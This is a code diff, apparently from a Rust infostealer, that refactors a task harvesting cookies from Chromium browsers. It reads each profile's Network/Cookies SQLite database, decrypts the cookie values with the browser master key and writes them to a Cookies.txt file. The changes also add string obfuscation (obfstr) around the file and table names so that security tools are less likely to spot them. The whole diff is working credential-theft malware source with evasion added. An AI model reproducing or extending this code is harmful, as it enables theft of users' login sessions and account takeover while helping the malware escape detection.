@@ -10,12 +10,13 @@ use utils::browsers::chromium::{decrypt_data};
 use utils::path::{Path, WriteToFile};
 use crate::chromium::{Browser};
 use crate::Cookie;
+use obfstr::obfstr as s;
 
-const COOKIES_HOST_KEY: usize                = 1;
-const COOKIES_NAME: usize                    = 3;
-const COOKIES_ENCRYPTED_VALUE: usize         = 5;
-const COOKIES_PATH: usize                    = 6;
-const COOKIES_EXPIRES_UTC: usize             = 7;
+const COOKIES_HOST_KEY: usize        = 1;
+const COOKIES_NAME: usize            = 3;
+const COOKIES_ENCRYPTED_VALUE: usize = 5;
+const COOKIES_PATH: usize            = 6;
+const COOKIES_EXPIRES_UTC: usize     = 7;
 
 pub(super) struct CookiesTask {
     browser: Arc<Browser>
@@ -25,27 +26,19 @@ impl CookiesTask {
     pub(super) fn new(browser: Arc<Browser>) -> Self {
         Self { browser }
     }
-
-    fn collect_cookies(&self) -> Vec<Cookie> {
-        let mut result = Vec::new();
-
-        for profile in &self.browser.profiles {
-            let Some(cookies) = get_cookies(profile, &self.browser.master_key) else {
-                continue
-            };
-
-            result.extend(cookies);
-        }
-
-        result
-    }
 }
 
 impl Task for CookiesTask {
     parent_name!("Cookies.txt");
 
     unsafe fn run(&self, parent: &Path) {
-        let mut cookies = self.collect_cookies();
+        let mut cookies: Vec<Cookie> = self.browser
+            .profiles
+            .iter()
+            .filter_map(|profile| get_cookies(profile, &self.browser.master_key))
+            .flat_map(|v| v.into_iter())
+            .collect();
+        
         if cookies.is_empty() {
             return
         }
@@ -63,21 +56,15 @@ impl Task for CookiesTask {
 }
 
 fn get_cookies(profile: &Path, master_key: &[u8]) -> Option<Vec<Cookie>> {
-    let cookies_path = profile / "Network" / "Cookies";
+    let cookies_path = profile / s!("Network") / s!("Cookies");
     let bytes = cookies_path.read_file().ok()?;
 
     let db = read_sqlite3_database_by_bytes(&bytes)?;
-    let table = db.read_table("Cookies")?;
+    let table = db.read_table(s!("Cookies"))?;
 
-    let mut cookies = Vec::with_capacity(table.records_length());
-
-    for record in table {
-        let Some(cookie) = extract_cookie_from_record(&record, master_key) else {
-            continue
-        };
-
-        cookies.push(cookie);
-    }
+    let cookies = table
+        .filter_map(|record| extract_cookie_from_record(&record, master_key))
+        .collect();
 
     Some(cookies)
 }
